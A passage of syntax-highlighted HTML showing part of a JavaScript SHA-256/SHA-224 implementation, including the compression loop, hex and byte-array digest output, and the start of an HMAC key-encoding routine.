blocks[<span class="hljs-number">1</span>] = blocks[<span class="hljs-number">2</span>] = blocks[<span class="hljs-number">3</span>] = blocks[<span class="hljs-number">4</span>] = blocks[<span class="hljs-number">5</span>] = blocks[<span class="hljs-number">6</span>] = blocks[<span class="hljs-number">7</span>] = blocks[<span class="hljs-number">8</span>] = blocks[<span class="hljs-number">9</span>] = blocks[<span class="hljs-number">10</span>] = blocks[<span class="hljs-number">11</span>] = blocks[<span class="hljs-number">12</span>] = blocks[<span class="hljs-number">13</span>] = blocks[<span class="hljs-number">14</span>] = blocks[<span class="hljs-number">15</span>] = <span class="hljs-number">0</span><br>        &#125;<br>        blocks[<span class="hljs-number">14</span>] = <span class="hljs-variable language_">this</span>.<span class="hljs-property">hBytes</span> &lt;&lt; <span class="hljs-number">3</span> | <span class="hljs-variable language_">this</span>.<span class="hljs-property">bytes</span> &gt;&gt;&gt; <span class="hljs-number">29</span>;<br>        blocks[<span class="hljs-number">15</span>] = <span class="hljs-variable language_">this</span>.<span class="hljs-property">bytes</span> &lt;&lt; <span class="hljs-number">3</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">hash</span>()<br>    &#125;;<br>    <span class="hljs-title class_">Sha256</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">hash</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">var</span> a = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h0</span>,<br>            b = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h1</span>,<br>            c = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h2</span>,<br>            d = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h3</span>,<br>            e = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h4</span>,<br>            f = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h5</span>,<br>            g = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h6</span>,<br>            h = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h7</span>,<br>            blocks = <span class="hljs-variable language_">this</span>.<span class="hljs-property">blocks</span>,<br>            j, s0, s1, maj, t1, t2, ch, ab, da, cd, bc;<br>        <span class="hljs-keyword">for</span> (j = <span class="hljs-number">16</span>; j &lt; <span class="hljs-number">64</span>; ++j) &#123;<br>            t1 = blocks[j - <span class="hljs-number">15</span>];<br>            s0 = ((t1 &gt;&gt;&gt; <span class="hljs-number">7</span>) | (t1 &lt;&lt; <span class="hljs-number">25</span>)) ^ ((t1 &gt;&gt;&gt; <span class="hljs-number">18</span>) | (t1 &lt;&lt; <span class="hljs-number">14</span>)) ^ (t1 &gt;&gt;&gt; <span class="hljs-number">3</span>);<br>            t1 = blocks[j - <span class="hljs-number">2</span>];<br>            s1 = ((t1 &gt;&gt;&gt; <span class="hljs-number">17</span>) | (t1 &lt;&lt; <span class="hljs-number">15</span>)) ^ ((t1 &gt;&gt;&gt; <span class="hljs-number">19</span>) | (t1 &lt;&lt; <span class="hljs-number">13</span>)) ^ (t1 &gt;&gt;&gt; <span class="hljs-number">10</span>);<br>            blocks[j] = blocks[j - <span class="hljs-number">16</span>] + s0 + blocks[j - <span class="hljs-number">7</span>] + s1 &lt;&lt; <span class="hljs-number">0</span><br>        &#125;<br>        bc = b &amp; c;<br>        <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">64</span>; j += <span class="hljs-number">4</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">first</span>) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">is224</span>) &#123;<br>                    ab = <span class="hljs-number">300032</span>;<br>                    t1 = blocks[<span class="hljs-number">0</span>] - <span class="hljs-number">1413257819</span>;<br>                    h = t1 - <span class="hljs-number">150054599</span> &lt;&lt; <span class="hljs-number">0</span>;<br>                    d = t1 + <span class="hljs-number">24177077</span> &lt;&lt; <span class="hljs-number">0</span><br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    ab = <span class="hljs-number">704751109</span>;<br>                    t1 = blocks[<span class="hljs-number">0</span>] - <span class="hljs-number">210244248</span>;<br>                    h = t1 - <span class="hljs-number">1521486534</span> &lt;&lt; <span class="hljs-number">0</span>;<br>                    d = t1 + <span class="hljs-number">143694565</span> &lt;&lt; <span class="hljs-number">0</span><br>                &#125;<br>                <span class="hljs-variable language_">this</span>.<span class="hljs-property">first</span> = <span class="hljs-literal">false</span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                s0 = ((a &gt;&gt;&gt; <span class="hljs-number">2</span>) | (a &lt;&lt; <span class="hljs-number">30</span>)) ^ ((a &gt;&gt;&gt; <span class="hljs-number">13</span>) | (a &lt;&lt; <span class="hljs-number">19</span>)) ^ ((a &gt;&gt;&gt; <span class="hljs-number">22</span>) | (a &lt;&lt; <span class="hljs-number">10</span>));<br>                s1 = ((e &gt;&gt;&gt; <span class="hljs-number">6</span>) | (e &lt;&lt; <span class="hljs-number">26</span>)) ^ ((e &gt;&gt;&gt; <span class="hljs-number">11</span>) | (e &lt;&lt; <span class="hljs-number">21</span>)) ^ ((e &gt;&gt;&gt; <span class="hljs-number">25</span>) | (e &lt;&lt; <span class="hljs-number">7</span>));<br>                ab = a &amp; b;<br>                maj = ab ^ (a &amp; c) ^ bc;<br>                ch = (e &amp; f) ^ (~e &amp; g);<br>                t1 = h + s1 + ch + K[j] + blocks[j];<br>                t2 = s0 + maj;<br>                h = d + t1 &lt;&lt; <span class="hljs-number">0</span>;<br>                d = t1 + t2 &lt;&lt; <span class="hljs-number">0</span><br>            &#125;<br>            s0 = ((d &gt;&gt;&gt; <span class="hljs-number">2</span>) | (d &lt;&lt; <span class="hljs-number">30</span>)) ^ ((d &gt;&gt;&gt; <span class="hljs-number">13</span>) | (d &lt;&lt; <span class="hljs-number">19</span>)) ^ ((d &gt;&gt;&gt; <span class="hljs-number">22</span>) | (d &lt;&lt; <span class="hljs-number">10</span>));<br>            s1 = ((h &gt;&gt;&gt; <span class="hljs-number">6</span>) | (h &lt;&lt; <span class="hljs-number">26</span>)) ^ ((h &gt;&gt;&gt; <span class="hljs-number">11</span>) | (h &lt;&lt; <span class="hljs-number">21</span>)) ^ ((h &gt;&gt;&gt; <span class="hljs-number">25</span>) | (h &lt;&lt; <span class="hljs-number">7</span>));<br>            da = d &amp; a;<br>            maj = da ^ (d &amp; b) ^ ab;<br>            ch = (h &amp; e) ^ (~h &amp; f);<br>            t1 = g + s1 + ch + K[j + <span class="hljs-number">1</span>] + blocks[j + <span class="hljs-number">1</span>];<br>            t2 = s0 + maj;<br>            g = c + t1 &lt;&lt; <span class="hljs-number">0</span>;<br>            c = t1 + t2 &lt;&lt; <span class="hljs-number">0</span>;<br>            s0 = ((c &gt;&gt;&gt; <span class="hljs-number">2</span>) | (c &lt;&lt; <span class="hljs-number">30</span>)) ^ ((c &gt;&gt;&gt; <span class="hljs-number">13</span>) | (c &lt;&lt; <span class="hljs-number">19</span>)) ^ ((c &gt;&gt;&gt; <span class="hljs-number">22</span>) | (c &lt;&lt; <span class="hljs-number">10</span>));<br>            s1 = ((g &gt;&gt;&gt; <span class="hljs-number">6</span>) | (g &lt;&lt; <span class="hljs-number">26</span>)) ^ ((g &gt;&gt;&gt; <span class="hljs-number">11</span>) | (g &lt;&lt; <span class="hljs-number">21</span>)) ^ ((g &gt;&gt;&gt; <span class="hljs-number">25</span>) | (g &lt;&lt; <span class="hljs-number">7</span>));<br>            cd = c &amp; d;<br>            maj = cd ^ (c &amp; a) ^ da;<br>            ch = (g &amp; h) ^ (~g &amp; e);<br>            t1 = f + s1 + ch + K[j + <span class="hljs-number">2</span>] + blocks[j + <span class="hljs-number">2</span>];<br>            t2 = s0 + maj;<br>            f = b + t1 &lt;&lt; <span class="hljs-number">0</span>;<br>            b = t1 + t2 &lt;&lt; <span class="hljs-number">0</span>;<br>            s0 = ((b &gt;&gt;&gt; <span class="hljs-number">2</span>) | (b &lt;&lt; <span class="hljs-number">30</span>)) ^ ((b &gt;&gt;&gt; <span class="hljs-number">13</span>) | (b &lt;&lt; <span class="hljs-number">19</span>)) ^ ((b &gt;&gt;&gt; <span class="hljs-number">22</span>) | (b &lt;&lt; <span class="hljs-number">10</span>));<br>            s1 = ((f &gt;&gt;&gt; <span class="hljs-number">6</span>) | (f &lt;&lt; <span class="hljs-number">26</span>)) ^ ((f &gt;&gt;&gt; <span class="hljs-number">11</span>) | (f &lt;&lt; <span class="hljs-number">21</span>)) ^ ((f &gt;&gt;&gt; <span class="hljs-number">25</span>) | (f &lt;&lt; <span class="hljs-number">7</span>));<br>            bc = b &amp; c;<br>            maj = bc ^ (b &amp; d) ^ cd;<br>            ch = (f &amp; g) ^ (~f &amp; h);<br>            t1 = e + s1 + ch + K[j + <span class="hljs-number">3</span>] + blocks[j + <span class="hljs-number">3</span>];<br>            t2 = s0 + maj;<br>            e = a + t1 &lt;&lt; <span class="hljs-number">0</span>;<br>            a = t1 + t2 &lt;&lt; <span class="hljs-number">0</span><br>        &#125;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">h0</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h0</span> + a &lt;&lt; <span class="hljs-number">0</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">h1</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h1</span> + b &lt;&lt; <span class="hljs-number">0</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">h2</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h2</span> + c &lt;&lt; <span class="hljs-number">0</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">h3</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h3</span> + d &lt;&lt; <span class="hljs-number">0</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">h4</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h4</span> + e &lt;&lt; <span class="hljs-number">0</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">h5</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h5</span> + f &lt;&lt; <span class="hljs-number">0</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">h6</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h6</span> + g &lt;&lt; <span class="hljs-number">0</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">h7</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h7</span> + h &lt;&lt; <span class="hljs-number">0</span><br>    &#125;;<br>    <span class="hljs-title class_">Sha256</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">hex</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">finalize</span>();<br>        <span class="hljs-keyword">var</span> h0 = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h0</span>,<br>            h1 = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h1</span>,<br>            h2 = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h2</span>,<br>            h3 = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h3</span>,<br>            h4 = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h4</span>,<br>            h5 = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h5</span>,<br>            h6 = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h6</span>,<br>            h7 = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h7</span>;<br>        <span class="hljs-keyword">var</span> hex = <span class="hljs-variable constant_">HEX_CHARS</span>[(h0 &gt;&gt; <span class="hljs-number">28</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h0 &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h0 &gt;&gt; <span class="hljs-number">20</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h0 &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h0 &gt;&gt; <span class="hljs-number">12</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h0 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h0 &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[h0 &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h1 &gt;&gt; <span class="hljs-number">28</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h1 &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h1 &gt;&gt; <span class="hljs-number">20</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h1 &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h1 &gt;&gt; <span class="hljs-number">12</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h1 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h1 &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[h1 &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h2 &gt;&gt; <span class="hljs-number">28</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h2 &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h2 &gt;&gt; <span class="hljs-number">20</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h2 &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h2 &gt;&gt; <span class="hljs-number">12</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h2 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h2 &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[h2 &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h3 &gt;&gt; <span class="hljs-number">28</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h3 &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h3 &gt;&gt; <span class="hljs-number">20</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h3 &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h3 &gt;&gt; <span class="hljs-number">12</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h3 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h3 &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[h3 &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h4 &gt;&gt; <span class="hljs-number">28</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h4 &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h4 &gt;&gt; <span class="hljs-number">20</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h4 &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h4 &gt;&gt; <span class="hljs-number">12</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h4 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h4 &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[h4 &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h5 &gt;&gt; <span class="hljs-number">28</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h5 &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h5 &gt;&gt; <span class="hljs-number">20</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h5 &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h5 &gt;&gt; <span class="hljs-number">12</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h5 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h5 &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[h5 &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h6 &gt;&gt; <span class="hljs-number">28</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h6 &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h6 &gt;&gt; <span class="hljs-number">20</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h6 &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h6 &gt;&gt; <span class="hljs-number">12</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h6 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h6 &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[h6 &amp; <span class="hljs-number">0x0F</span>];<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">is224</span>) &#123;<br>            hex += <span class="hljs-variable constant_">HEX_CHARS</span>[(h7 &gt;&gt; <span class="hljs-number">28</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h7 &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h7 &gt;&gt; <span class="hljs-number">20</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h7 &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h7 &gt;&gt; <span class="hljs-number">12</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h7 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h7 &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[h7 &amp; <span class="hljs-number">0x0F</span>]<br>        &#125;<br>        <span class="hljs-keyword">return</span> hex<br>    &#125;;<br>    <span class="hljs-title class_">Sha256</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">toString</span> = <span class="hljs-title class_">Sha256</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">hex</span>;<br>    <span class="hljs-title class_">Sha256</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">digest</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">finalize</span>();<br>        <span class="hljs-keyword">var</span> h0 = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h0</span>,<br>            h1 = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h1</span>,<br>            h2 = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h2</span>,<br>            h3 = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h3</span>,<br>            h4 = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h4</span>,<br>            h5 = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h5</span>,<br>            h6 = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h6</span>,<br>            h7 = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h7</span>;<br>        <span class="hljs-keyword">var</span> arr = [(h0 &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFF</span>, (h0 &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>, (h0 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>, h0 &amp; <span class="hljs-number">0xFF</span>, (h1 &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFF</span>, (h1 &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>, (h1 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>, h1 &amp; <span class="hljs-number">0xFF</span>, (h2 &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFF</span>, (h2 &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>, (h2 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>, h2 &amp; <span class="hljs-number">0xFF</span>, (h3 &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFF</span>, (h3 &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>, (h3 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>, h3 &amp; <span class="hljs-number">0xFF</span>, (h4 &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFF</span>, (h4 &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>, (h4 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>, h4 &amp; <span class="hljs-number">0xFF</span>, (h5 &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFF</span>, (h5 &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>, (h5 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>, h5 &amp; <span class="hljs-number">0xFF</span>, (h6 &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFF</span>, (h6 &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>, (h6 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>, h6 &amp; <span class="hljs-number">0xFF</span>];<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">is224</span>) &#123;<br>            arr.<span class="hljs-title function_">push</span>((h7 &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFF</span>, (h7 &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>, (h7 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>, h7 &amp; <span class="hljs-number">0xFF</span>)<br>        &#125;<br>        <span class="hljs-keyword">return</span> arr<br>    &#125;;<br>    <span class="hljs-title class_">Sha256</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">array</span> = <span class="hljs-title class_">Sha256</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">digest</span>;<br>    <span class="hljs-title class_">Sha256</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">arrayBuffer</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">finalize</span>();<br>        <span class="hljs-keyword">var</span> buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">is224</span> ? <span class="hljs-number">28</span> : <span class="hljs-number">32</span>);<br>        <span class="hljs-keyword">var</span> dataView = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataView</span>(buffer);<br>        dataView.<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">0</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">h0</span>);<br>        dataView.<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">4</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">h1</span>);<br>        dataView.<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">8</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">h2</span>);<br>        dataView.<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">12</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">h3</span>);<br>        dataView.<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">16</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">h4</span>);<br>        dataView.<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">20</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">h5</span>);<br>        dataView.<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">24</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">h6</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">is224</span>) &#123;<br>            dataView.<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">28</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">h7</span>)<br>        &#125;<br>        <span class="hljs-keyword">return</span> buffer<br>    &#125;;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">HmacSha256</span>(<span class="hljs-params">key, is224, sharedMemory</span>) &#123;<br>        <span class="hljs-keyword">var</span> i, type = <span class="hljs-keyword">typeof</span> key;<br>        <span class="hljs-keyword">if</span> (type === <span class="hljs-string">&#x27;string&#x27;</span>) &#123;<br>            <span class="hljs-keyword">var</span> bytes = [],<br>                length = key.<span class="hljs-property">length</span>,<br>                index = <span class="hljs-number">0</span>,<br>                code;<br>            <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>                code = key.<span class="hljs-title function_">charCodeAt</span>(i);<br>                <span class="hljs-keyword">if</span> (code &lt; <span class="hljs-number">0x80</span>) &#123;<br>                    bytes[index++] = code<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (code &lt; <span class="hljs-number">0x800</span>) &#123;<br>                    bytes[index++] = (<span class="hljs-number">0xc0</span> | (code &gt;&gt; <span class="hljs-number">6</span>));<br>                    bytes[index++] = (<span class="hljs-number">0x80</span> | (code &amp; <span class="hljs-number">0x3f</span>))<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (code &lt; <span class="hljs-number">0xd800</span> || code &gt;= <span class="hljs-number">0xe000</span>) &#123;<br>                    bytes[index++] = (<span class="hljs-number">0xe0</span> | (code &gt;&gt; <span class="hljs-number">12</span>));<br>                    bytes[index++] = (<span class="hljs-number">0x80</span> | ((code &gt;&gt; <span class="hljs-number">6</span>) &amp; <span class="hljs-number">0x3f</span>));<br>                    bytes[index++] = (<span class="hljs-number">0x80</span> | (code &amp; <span class="hljs-number">0x3f</span>))<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    code = <span class="hljs-number">0x10000</span> + (((code &amp; <span class="hljs-number">0x3ff</span>) &lt;&lt; <span 